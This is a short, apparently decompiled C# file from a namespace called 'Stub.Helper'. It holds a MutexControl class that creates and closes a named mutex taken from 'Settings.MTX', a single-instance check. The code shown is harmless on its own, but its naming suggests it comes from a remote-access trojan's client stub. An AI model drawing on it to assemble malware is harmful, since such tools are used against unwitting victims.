using System;
using System.Threading;

namespace Stub.Helper
{
	// Token: 0x02000022 RID: 34
	public static class MutexControl
	{
		// Token: 0x060000AE RID: 174 RVA: 0x00005E6C File Offset: 0x0000406C
		public static bool CreateMutex()
		{
			bool result;
			MutexControl.currentApp = new Mutex(false, Settings.MTX, ref result);
			return result;
		}

		// Token: 0x060000AF RID: 175 RVA: 0x0000243C File Offset: 0x0000063C
		public static void CloseMutex()
		{
			if (MutexControl.currentApp != null)
			{
				MutexControl.currentApp.Close();
				MutexControl.currentApp.Dispose();
			}
		}

		// Token: 0x0400002C RID: 44
		public static Mutex currentApp;
	}
}
